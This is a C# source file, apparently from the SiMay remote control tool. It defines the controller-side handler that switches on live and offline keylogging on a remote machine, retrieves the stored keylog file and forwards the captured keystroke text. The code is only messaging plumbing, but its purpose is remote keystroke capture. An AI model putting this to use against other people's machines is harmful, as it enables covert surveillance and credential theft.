using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using SiMay.Core;
using SiMay.Core.Extensions;
using SiMay.Core.PacketModelBinder.Attributes;
using SiMay.Core.PacketModelBinding;
using SiMay.Net.SessionProvider.SessionBased;

namespace SiMay.RemoteControlsCore.HandlerAdapters
{
    public class KeyboardAdapterHandler : AdapterHandlerBase
    {
        public event Action<KeyboardAdapterHandler, string> OnKeyboardDataEventHandler;

        public event Action<KeyboardAdapterHandler, string> OnOffLineKeyboradEventHandler;

        private PacketModelBinder<SessionHandler> _handlerBinder = new PacketModelBinder<SessionHandler>();
        internal override void MessageReceived(SessionHandler session)
        {
            if (this.IsClose)
                return;

            _handlerBinder.InvokePacketHandler(session, session.CompletedBuffer.GetMessageHead(), this);
        }

        [PacketHandler(MessageHead.C_KEYBOARD_DATA)]
        public void KeyBoardDataHandler(SessionHandler session)
        {
            var text = session.CompletedBuffer.GetMessagePayload().ToUnicodeString();
            this.OnKeyboardDataEventHandler?.Invoke(this, text);
        }

        [PacketHandler(MessageHead.C_KEYBOARD_OFFLINEFILE)]
        public void OffLinesDataHandler(SessionHandler session)
        {
            var text = session.CompletedBuffer.GetMessagePayload().ToUnicodeString();
            this.OnOffLineKeyboradEventHandler?.Invoke(this, text);
        }

        public void StartGetKeyorad()
        {
            SendAsyncMessage(MessageHead.S_KEYBOARD_ONOPEN);
        }

        public void StartOffLineKeyboard()
        {
            SendAsyncMessage(MessageHead.S_KEYBOARD_OFFLINE);
        }

        public void GetOffLineKeyboardData()
        {
            SendAsyncMessage(MessageHead.S_KEYBOARD_GET_OFFLINEFILE);
        }
        public override void CloseHandler()
        {
            this._handlerBinder.Dispose();
            base.CloseHandler();
        }
    }
}
